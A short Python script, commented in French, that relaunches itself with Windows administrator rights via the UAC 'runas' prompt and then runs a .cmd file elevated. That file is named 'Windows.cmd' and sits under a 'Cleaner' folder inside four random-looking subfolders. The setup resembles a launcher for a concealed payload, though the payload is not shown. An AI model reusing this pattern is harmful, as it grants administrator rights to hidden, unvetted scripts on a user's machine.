import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if is_admin():
        # Le script est déjà exécuté avec des privilèges d'administrateur
        print("Le script est déjà exécuté avec des privilèges d'administrateur.")
    else:
        # Relancer le script avec des privilèges d'administrateur
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def run_cmd_as_admin(cmd_file_path):
    ctypes.windll.shell32.ShellExecuteW(None, "runas", cmd_file_path, None, None, 1)

if __name__ == "__main__":
    run_as_admin()
    # Exécuter le fichier .CMD ici
    cmd_path = r"Cleaner\2n50rQxgggMGm9iZWD\1EaaX9KYY21YzP7fQU\b0jCOIBdeAoNSlo4lV\443mPOzSCoDCuPdkir\Windows.cmd"  # Remplacez par votre propre chemin
    run_cmd_as_admin(cmd_path)
